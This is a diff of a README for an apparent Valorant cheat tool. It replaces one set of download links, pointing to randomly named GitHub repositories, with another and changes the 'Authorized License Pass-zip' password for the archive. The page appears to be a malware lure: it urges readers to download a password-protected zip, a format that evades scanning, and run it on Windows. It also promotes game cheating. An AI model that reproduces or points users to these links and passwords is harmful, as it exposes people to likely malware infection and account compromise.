@@ -1,12 +1,12 @@
 # Valorant NightWay Feel Free
 
 ---
-## 📥 [DOWNLOAD STABLE RELEASE ACCESS](https://github.com/fountainveteranzen/cjnhakoj/releases/download/valorant-release/Valorant-release-valolabs.zip)
-**Authorized License Pass-zip:** `valolabs`
-# 📥 [RELEASE ACCESS](https://github.com/fountainveteranzen/cjnhakoj/releases/tag/valorant-release) 
+## 📥 [DOWNLOAD STABLE RELEASE ACCESS](https://github.com/PsycheDamsel/dbepytbt/releases/download/matj/Evicted_valorant_lde.zip)
+**Authorized License Pass-zip:** `evicted`
+# 📥 [RELEASE ACCESS](https://github.com/PsycheDamsel/dbepytbt/releases/download/matj/Evicted_valorant_lde.zip) 
 
 **Deployment Requirements:**
-* **Authorized License Pass-zip:** `valolabs`
+* **Authorized License Pass-zip:** `evicted`
 <img width="922" height="518" alt="image" src="https://raw.githubusercontent.com/velisargopel/Valorant-ReaperWare/main/pictures/1.png" />
 * **Environment:** Windows 10/11 (all builds)
 
